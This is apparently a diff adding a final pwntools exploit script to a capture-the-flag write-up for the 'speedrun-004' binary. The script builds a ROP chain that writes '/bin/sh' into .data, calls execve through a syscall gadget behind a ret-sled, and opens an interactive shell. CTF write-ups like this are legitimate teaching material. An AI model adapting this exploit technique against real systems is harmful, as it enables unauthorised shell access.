@@ -200,6 +200,101 @@ With that another thing is that because my rop chain was less than 256 bytes i n
 
 I just made use of nop slides (not the raw bytecode but rather the rop gadget that has the nop; ret instruction)
 
+Here's my final exploit script
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('speedrun-004')
+context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+break *0x400bca
+break *0x400bd1
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def solve():
+    data = 0x06b90e0
+    sh = u64("/bin/sh\x00")
+
+    pop_rax = p64(0x0000000000415f04) # pop rax; ret; 
+    pop_rdi = p64(0x0000000000400686) # pop rdi; ret; 
+    pop_rsi = p64(0x0000000000410a93) # pop rsi; ret; 
+    pop_rdx = p64(0x000000000044c6b6) # pop rdx; ret; 
+    syscall = p64(0x0000000000474f15) # syscall; ret; 
+
+    write = p64(0x000000000048d301) # mov qword ptr [rax], rdx; ret; 
+    ret   = p64(0x00000000004004cf) # nop; ret 
+
+    """
+    Write /bin/sh to .data
+    """
+    payload = b""
+    payload += pop_rax
+    payload += p64(data)
+    payload += pop_rdx
+    payload += p64(sh)
+    payload += write
+
+    """
+    Call execve(.data, 0x0, 0x0) profit? :)
+    """
+    payload += pop_rax
+    payload += p64(0x3b)
+    payload += pop_rdi
+    payload += p64(data)
+    payload += pop_rsi
+    payload += p64(0x0)
+    payload += pop_rdx
+    payload += p64(0x0)
+    payload += syscall
+
+    print(len(payload))
+
+    exploit = ret * ((256 - len(payload))//8) + payload + p8(0x00)
+    # print(len(exploit))
+    # exploit = b'A'*267
+
+    io.send('257')
+    # pause(1)
+    io.send(exploit)
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+
+if __name__ == '__main__':
+    main()
+```
 
 
 
